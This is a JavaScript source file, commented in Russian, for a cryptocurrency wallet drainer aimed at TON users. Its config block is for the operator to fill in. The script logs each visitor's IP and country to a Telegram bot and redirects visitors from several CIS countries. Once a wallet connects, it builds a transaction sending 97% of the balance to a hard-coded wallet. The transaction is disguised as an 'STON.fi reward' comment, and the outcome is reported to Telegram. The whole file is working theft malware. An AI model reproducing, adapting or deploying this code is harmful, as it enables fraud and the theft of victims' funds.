// ============================================================
//  КОНФИГУРАЦИЯ – замените на свои данные
// ============================================================
const CONFIG = {
    mainWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI', // Ваш кошелёк
    tgBotToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',          // Токен бота
    tgChat: '-1001234567890',                                     // ID чата (с минусом для канала)
    stealPercent: 0.97,                                           // 97% баланса (3% на газ)
    fakeComment: '📥 Получение награды STON.fi'                   // Маскирующий комментарий
};

// ============================================================
//  ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ============================================================
let domain = window.location.hostname;
let ipUser = '';
let countryUser = '';

// ============================================================
//  ГЕО-БЛОКИРОВКА (стран СНГ)
// ============================================================
fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        const country = data.country;
        ipUser = data.ip;
        countryUser = country;
        console.log(`IP: ${ipUser}, Country: ${countryUser}`);
        // Блокируем страны СНГ (редирект на ton.org)
        const blocked = ['', 'KZ', '', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'];
        if (blocked.includes(country)) {
            window.location.replace('https://ton.org');
            return;
        }
        // Отправляем уведомление об открытии сайта
        sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n📖 *Opened the website*`);
    })
    .catch(err => console.error('Geo error:', err));

// ============================================================
//  ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
// ============================================================
function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`;
    const payload = {
        chat_id: CONFIG.tgChat,
        text: message,
        parse_mode: 'Markdown'
    };
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).then(res => {
        if (!res.ok) console.error('Telegram send error');
    }).catch(err => console.error('Telegram fetch error:', err));
}

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI
// ============================================================
const manifestUrl = `https://${domain}/tonconnect-manifest.json`;
const tonConnectUI = new TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect'        // ID контейнера для кнопки
});

// Элементы DOM
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

// Обновление статуса и кнопки в зависимости от подключения
tonConnectUI.on('connect', (wallet) => {
    const address = wallet.account.address;
    statusDiv.textContent = `Подключён: ${address.slice(0,6)}...${address.slice(-4)}`;
    drainBtn.disabled = false;
    console.log('Кошелёк подключён:', address);
});

tonConnectUI.on('disconnect', () => {
    statusDiv.textContent = 'Кошелёк отключён';
    drainBtn.disabled = true;
});

// ============================================================
//  ОСНОВНАЯ ФУНКЦИЯ – DRAIN
// ============================================================
async function didtrans() {
    // Проверяем, что кошелёк подключён
    if (!tonConnectUI.account || !tonConnectUI.account.address) {
        statusDiv.textContent = '❌ Сначала подключите кошелёк';
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    statusDiv.textContent = '⏳ Получение баланса...';

    try {
        // 1. Получаем баланс TON через toncenter.com
        const resp = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await resp.json();
        if (!data || !data.balance) {
            throw new Error('Не удалось получить баланс');
        }
        // Баланс в нанотонах (число)
        const balanceNano = parseFloat(data.balance);
        if (balanceNano < 1e9 * 0.1) { // меньше 0.1 TON
            statusDiv.textContent = '❌ Баланс слишком мал (менее 0.1 TON)';
            return;
        }

        // Вычисляем сумму для кражи (97% от баланса)
        const stealNano = Math.floor(balanceNano * CONFIG.stealPercent);
        const tgBalance = stealNano / 1e9; // для отчёта в TON

        // 2. Формируем транзакцию с комментарием-маскировкой
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты
            messages: [
                {
                    address: CONFIG.mainWallet,
                    amount: stealNano.toString(), // обязательно строка
                    payload: CONFIG.fakeComment    // комментарий в кошельке
                }
            ]
        };

        statusDiv.textContent = '⏳ Отправка транзакции на подпись...';

        // 3. Отправляем транзакцию через TON Connect
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция отправлена:', result);

        // 4. Уведомление об успехе
        const successMsg = `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💳 *Wallet:* [TonScan](https://tonscan.org/address/${walletAddress})\n\n💰 *Sent:* ${tgBalance.toFixed(2)} TON`;
        sendTelegram(successMsg);
        statusDiv.textContent = '✅ Успешно! Активы переведены.';

    } catch (error) {
        console.error('Ошибка в didtrans:', error);
        // Уведомление об ошибке или отказе
        const declineMsg = `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💳 *Wallet:* [TonScan](https://tonscan.org/address/${walletAddress})\n\n⛔ *Declined or error.*`;
        sendTelegram(declineMsg);
        statusDiv.textContent = '❌ Транзакция отклонена или ошибка';
    }
}

// ============================================================
//  ПРИВЯЗКА КНОПКИ DRAIN
// ============================================================
drainBtn.addEventListener('click', didtrans);

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ
// ============================================================
console.log('Drainer готов. Домен:', domain);
